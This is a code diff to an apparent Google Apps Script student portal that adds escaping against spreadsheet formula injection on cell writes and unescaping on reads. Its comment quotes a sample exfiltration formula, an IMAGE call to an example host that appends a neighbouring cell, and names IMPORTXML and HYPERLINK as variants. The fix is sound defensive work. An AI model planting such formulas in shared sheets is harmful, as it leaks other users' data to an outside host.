@@ -2942,7 +2942,7 @@ function apReadObjects(sheet) {
     var obj = {};
     var blank = true;
     for (var c = 0; c < headers.length; c++) {
-      obj[headers[c]] = data[i][c];
+      obj[headers[c]] = apUnsafeCell_(data[i][c]);
       if (data[i][c] !== '' && data[i][c] !== null) blank = false;
     }
     obj.__row = i + 1; // 1-based sheet row for in-place updates
@@ -2952,13 +2952,46 @@ function apReadObjects(sheet) {
 }
 
 // Build a row array aligned to the sheet's header order from a field map
+// ---- Spreadsheet formula injection ----------------------------------------
+// A Google Sheet treats any string starting = + - @ as a FORMULA, and it
+// evaluates when the sheet is opened. Every free-text field a student can type
+// into — a session note, an exercise name, a PB note, a year goal — is written
+// straight into a cell, so until now a student could type
+//
+//     =IMAGE("https://example.com/x?d="&A1)
+//
+// into a note, and it would run in the teacher's browser the next time the
+// sheet was opened, with the neighbouring cell appended to the request. The
+// same trick with IMPORTXML or HYPERLINK leaks whatever the formula can reach.
+// Nothing in the portal was guarding against it and nothing would have shown
+// a trace of it in the app.
+//
+// The fix is the standard one: prefix the dangerous first character with an
+// apostrophe, which Sheets reads as "this is text, not a formula". Numbers,
+// dates and booleans are left exactly as they are, so nothing that should be
+// arithmetic stops being arithmetic.
+function apSafeCell_(v) {
+  if (typeof v !== 'string' || !v) return v;
+  return /^[=+\-@\t\r]/.test(v) ? ("'" + v) : v;
+}
+function apSafeRow_(row) {
+  for (var i = 0; i < row.length; i++) row[i] = apSafeCell_(row[i]);
+  return row;
+}
+// The mirror of apSafeCell_, for reads. Only unwraps an apostrophe that is
+// actually shielding a formula character, so a legitimate "'Twas" is untouched.
+function apUnsafeCell_(v) {
+  if (typeof v !== 'string') return v;
+  return /^'[=+\-@\t\r]/.test(v) ? v.slice(1) : v;
+}
+
 function apBuildRow(sheet, fields) {
   var headers = sheet.getRange(1, 1, 1, sheet.getLastColumn()).getValues()[0];
   var row = new Array(headers.length);
   for (var c = 0; c < headers.length; c++) {
     row[c] = (fields.hasOwnProperty(headers[c])) ? fields[headers[c]] : '';
   }
-  return row;
+  return apSafeRow_(row);
 }
 
 // Write a field map onto an existing row (header-aligned, only provided fields)
@@ -2971,7 +3004,7 @@ function apUpdateRow(sheet, rowNum, fields) {
   for (var c = 0; c < headers.length; c++) {
     if (fields.hasOwnProperty(headers[c])) row[c] = fields[headers[c]];
   }
-  sheet.getRange(rowNum, 1, 1, lastCol).setValues([row]);
+  sheet.getRange(rowNum, 1, 1, lastCol).setValues([apSafeRow_(row)]);
 }
 
 // Minimal athlete lookup (name/grade/sport) for the portal nav + identity
